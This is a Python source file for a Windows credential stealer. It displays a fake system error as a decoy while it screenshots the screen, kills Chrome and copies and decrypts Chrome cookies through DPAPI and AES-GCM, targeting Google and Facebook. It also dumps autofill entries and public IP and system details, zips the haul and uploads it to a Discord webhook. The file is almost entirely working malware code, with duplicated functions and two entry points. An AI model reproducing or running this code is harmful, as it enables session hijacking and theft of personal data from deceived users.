#Do whatever the fuck you want with this code, but don't blame me if you get in trouble.

import tkinter as tk
from tkinter import messagebox
from PIL import ImageGrab
import threading
import sqlite3
import os
import shutil
import json
import zipfile
import glob
import time
from datetime import datetime
import requests  # For IP lookup
import socket    # For local network info
import platform  # For system details
import psutil  # For process management

# Create a folder for output
OUTPUT_FOLDER = "CollectedData"
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

def show_fake_error():
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Critical Error", "System32.dll not found! This application will now close.")
    root.destroy()

def take_screenshot():
    screenshot_folder = os.path.join(OUTPUT_FOLDER, "screenshots")
    os.makedirs(screenshot_folder, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    screenshot_path = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
    
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)
    print(f"[+] Screenshot saved to {screenshot_path}")
    return screenshot_path

def find_chrome_cookies():
    """Returns path to active Cookies file or None if not found"""
    # Check standard locations
    possible_roots = [
        os.getenv('LOCALAPPDATA'),
        os.path.expanduser("~"),
        r"C:",
    ]

    possible_paths = []
    for root in possible_roots:
        possible_paths.extend([
            os.path.join(root, r"Google\Chrome\User Data"),
            os.path.join(root, r"Chromium\User Data"),
            os.path.join(root, r"AppData\Local\Google\Chrome\User Data"),
            os.path.join(root, r"AppData\Local\Chromium\User Data"),
        ])

    # Check all possible paths
    for user_data in possible_paths:
        if not os.path.exists(user_data):
            continue

        # Check Default + all profiles
        profiles = ["Default"] + glob.glob(os.path.join(user_data, "Profile *"))
        
        for profile in profiles:
            # Pre-Chrome 94 location
            cookie_path = os.path.join(user_data, profile, "Cookies")
            if os.path.exists(cookie_path):
                return cookie_path
            
            # Chrome 94+ new location
            network_cookie_path = os.path.join(user_data, profile, "Network", "Cookies")
            if os.path.exists(network_cookie_path):
                return network_cookie_path

    return None

# Add these imports at the top of the file
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def get_chrome_cookies():
    """Main cookie extraction function - simplified to avoid decryption failures"""
    # Close Chrome completely
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and 'chrome' in proc.info['name'].lower():
            try:
                proc.kill()
            except:
                continue
    time.sleep(2)  # Wait for Chrome to fully exit

    # Find the cookies file
    cookie_path = find_chrome_cookies()
    if not cookie_path:
        print("[!] Could not locate Chrome cookies file in any standard location")
        return False

    print(f"[+] Found cookies at: {cookie_path}")

    # Prepare output
    output_dir = os.path.join(OUTPUT_FOLDER, "cookies")
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, "cookies.json")
    temp_db = os.path.join(output_dir, "temp_cookies.db")

    try:
        # Copy with retry logic
        for attempt in range(3):
            try:
                shutil.copy2(cookie_path, temp_db)
                break
            except PermissionError:
                time.sleep(1)
        else:
            print("[!] Failed to copy cookies database (file locked)")
            return False

        # Extract cookies
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Get more useful data without trying to decrypt
        cursor.execute("""
            SELECT host_key, name, path, expires_utc, is_secure, is_httponly, last_access_utc 
            FROM cookies
        """)
        
        cookies = []
        for host, name, path, expires, secure, httponly, last_access in cursor.fetchall():
            cookies.append({
                "host": host,
                "name": name,
                "path": path,
                "expires": expires,
                "secure": bool(secure),
                "httponly": bool(httponly),
                "last_access": last_access
            })

        # Save results
        with open(output_file, 'w') as f:
            json.dump(cookies, f, indent=4)

        print(f"[+] Successfully extracted {len(cookies)} cookies to {output_file}")
        
        # Also copy the raw database file for later analysis
        raw_db_path = os.path.join(output_dir, "raw_cookies.db")
        shutil.copy2(temp_db, raw_db_path)
        print(f"[+] Raw cookie database saved to {raw_db_path}")
        
        return True

    except Exception as e:
        print(f"[!] Error processing cookies: {str(e)}")
        return False
    finally:
        if 'conn' in locals():
            conn.close()
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass

def get_chrome_encryption_key():
    """Extracts Chrome's encryption key from Local State"""
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
    
    # Decrypt using Windows DPAPI
    import win32crypt
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_chrome_value(encrypted_value, key):
    """Decrypts Chrome-encrypted values"""
    try:
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:]
        
        cipher = Cipher(
            algorithms.AES(key),
            modes.GCM(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        return decryptor.update(payload).decode()
    except:
        # Fallback for older Chrome versions
        try:
            return str(win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1])
        except:
            return "[DECRYPTION FAILED]"

def get_chrome_cookies():
    """Main cookie extraction with decryption support"""
    # Kill Chrome process
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and 'chrome' in proc.info['name'].lower():
            try:
                proc.kill()
            except:
                continue
    time.sleep(2)

    # Get encryption key
    try:
        encryption_key = get_chrome_encryption_key()
    except Exception as e:
        print(f"[!] Failed to get encryption key: {e}")
        return False

    # Find cookies file
    cookie_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData", "Local", "Google", "Chrome",
        "User Data", "Default", "Network", "Cookies"
    )
    
    if not os.path.exists(cookie_path):
        print("[!] Cookies file not found at:", cookie_path)
        return False

    # Process cookies
    temp_db = "temp_cookies.db"
    try:
        shutil.copy2(cookie_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT host_key, name, encrypted_value 
            FROM cookies
            WHERE host_key LIKE '%google%' OR host_key LIKE '%facebook%'
        """)
        
        cookies = []
        for host, name, encrypted_value in cursor.fetchall():
            decrypted_value = decrypt_chrome_value(encrypted_value, encryption_key)
            cookies.append({
                "host": host,
                "name": name,
                "value": decrypted_value
            })
        
        # Save to file
        os.makedirs("CollectedData", exist_ok=True)
        with open("CollectedData/cookies.json", "w") as f:
            json.dump(cookies, f, indent=4)
            
        print(f"[+] Successfully decrypted {len(cookies)} cookies")
        return True
        
    except Exception as e:
        print(f"[!] Error processing cookies: {e}")
        return False
    finally:
        if 'conn' in locals():
            conn.close()
        if os.path.exists(temp_db):
            os.remove(temp_db)

def send_to_discord_webhook(webhook_url, file_path, content=None):
    """Sends a file to a Discord webhook"""
    try:
        file_name = os.path.basename(file_path)
        
        # Prepare multipart form data
        boundary = '----WebKitFormBoundary' + ''.join(['1234567890'[i % 10] for i in range(16)])
        
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
        }
        
        # Create payload
        payload = []
        
        # Add content if provided
        if content:
            payload.append(f'--{boundary}')
            payload.append('Content-Disposition: form-data; name="content"')
            payload.append('')
            payload.append(content)
        
        # Add file
        payload.append(f'--{boundary}')
        payload.append(f'Content-Disposition: form-data; name="file"; filename="{file_name}"')
        payload.append('Content-Type: application/octet-stream')
        payload.append('')
        
        # Join payload parts
        payload_str = '\r\n'.join(payload) + '\r\n'
        
        # Read file as binary
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        # Create final payload
        final_payload = payload_str.encode() + file_data + f'\r\n--{boundary}--'.encode()
        
        # Send request
        response = requests.post(webhook_url, headers=headers, data=final_payload)
        
        if response.status_code == 200 or response.status_code == 204:
            print(f"[+] Successfully sent {file_name} to Discord webhook")
            return True
        else:
            print(f"[!] Failed to send {file_name} to Discord webhook: {response.status_code}")
            return False
    
    except Exception as e:
        print(f"[!] Error sending to Discord webhook: {str(e)}")
        return False

if __name__ == "__main__":
    if get_chrome_cookies():
        print("Cookie extraction successful!")
    else:
        print("Cookie extraction failed")

def get_chrome_autofill():
    autofill_folder = os.path.join(OUTPUT_FOLDER, "autofill")
    os.makedirs(autofill_folder, exist_ok=True)
    
    autofill_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Web Data"
    temp_db = os.path.join(autofill_folder, "temp_autofill.db")
    output_file = os.path.join(autofill_folder, "autofill.json")
    
    conn = None  # Initialize to ensure it exists in finally block
    try:
        shutil.copy2(autofill_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM autofill")
        autofill_data = cursor.fetchall()
        
        with open(output_file, "w") as f:
            json.dump(autofill_data, f, indent=4)
        print(f"[+] Autofill data saved to {output_file}")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        if conn:  # Close the connection if it exists
            conn.close()
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except PermissionError:
                print(f"[!] Could not delete {temp_db} (still locked). Retrying...")
                import time
                time.sleep(1)  # Wait a bit and retry
                os.remove(temp_db)  # Second attempt

def get_network_info():
    network_folder = os.path.join(OUTPUT_FOLDER, "network")
    os.makedirs(network_folder, exist_ok=True)
    output_file = os.path.join(network_folder, "network_info.json")
    
    network_data = {}
    
    try:
        # Get public IP (VPN exit node)
        public_ip = requests.get("https://api.ipify.org").text
        network_data["public_ip"] = public_ip
        
        # Get local network details
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        network_data["hostname"] = hostname
        network_data["local_ip"] = local_ip
        
        # Get system info
        network_data["system"] = {
            "os": platform.system(),
            "version": platform.version(),
            "machine": platform.machine()
        }
        
        # Save to JSON
        with open(output_file, "w") as f:
            json.dump(network_data, f, indent=4)
        print(f"[+] Network data saved to {output_file}")
        
    except Exception as e:
        print(f"Error fetching network info: {e}")

def compress_to_zip():
    zip_path = f"{OUTPUT_FOLDER}.zip"
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(OUTPUT_FOLDER):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, OUTPUT_FOLDER)
                zipf.write(file_path, arcname)
    print(f"[+] Data compressed to {zip_path}")

if __name__ == "__main__":
    # Discord webhook URL - replace with your actual webhook URL when using
    WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"  # Replace this with your webhook URL
    
    # Run fake error in a thread
    error_thread = threading.Thread(target=show_fake_error)
    error_thread.start()
    
    # Collect data
    take_screenshot()
    
    # Use the simplified cookie extraction that doesn't try to decrypt
    cookie_path = find_chrome_cookies()
    if cookie_path:
        output_dir = os.path.join(OUTPUT_FOLDER, "cookies")
        os.makedirs(output_dir, exist_ok=True)
        raw_db_path = os.path.join(output_dir, "raw_cookies.db")
        shutil.copy2(cookie_path, raw_db_path)
        print(f"[+] Raw cookie database saved to {raw_db_path}")
    
    get_chrome_autofill()
    get_network_info()
    
    # Compress the data
    compress_to_zip()
    
    # Send the zip file to Discord
    zip_path = f"{OUTPUT_FOLDER}.zip"
    if os.path.exists(zip_path):
        system_info = f"Hostname: {socket.gethostname()}\nOS: {platform.system()} {platform.version()}"
        send_to_discord_webhook(WEBHOOK_URL, zip_path, system_info)
    
    # Wait for the error thread to finish
    error_thread.join()